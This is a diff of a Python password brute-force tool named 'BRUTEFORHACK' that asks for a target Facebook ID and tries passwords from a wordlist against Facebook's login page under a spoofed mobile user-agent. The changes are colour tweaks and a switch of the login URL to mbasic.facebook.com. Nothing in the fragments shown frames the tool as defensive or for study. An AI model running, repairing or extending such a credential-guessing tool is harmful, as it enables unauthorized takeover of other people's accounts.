@@ -25,7 +25,7 @@ logo = """ \033[1;91m
               :hds+/-`          `-/+sdh:
                 `/ymM+          oMmy:\033[1;97m
                   [\033[41;1m BRUTEFORHACK \033[00;1m]
-             Created By Ramdhan Ramadhian
+             \033[1;96mCreated By Ramdhan Ramadhian
 """
 
 print (logo)
@@ -34,7 +34,7 @@ def load():
 	print('')
 
 
-url = 'https://mobile.facebook.com/login.php'
+url = 'https://mbasic.facebook.com/login.php'
 headers = {
 	  'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
 }
@@ -43,7 +43,7 @@ chek = open('chek.txt','a')
 
 def request():
 	password = open(wordlist,'r').readlines()
-	print('\n\033[92mNumber Of Password : ',len(password),'\n')
+	print('\n\033[96mNumber Of Password : ',len(password),'\n')
 	print('\033[92m╭────\033[91m[\033[97m Enter Target ID\033[91m ]')
 	id = input('\033[92m╰────➲\033[93m ')
 	for line in password:
@@ -65,7 +65,7 @@ def request():
 			os.sys.exit()
 		else:
 			print('')
-			print('\033[91m]\033[90m Progress ==> \033[91m[\033[90;1m : ',pw)
+			print('\033[91m]\033[90m Detect ==> \033[91m[\033[91;1m : ',pw)
 			
 			
 if __name__=='__main__':
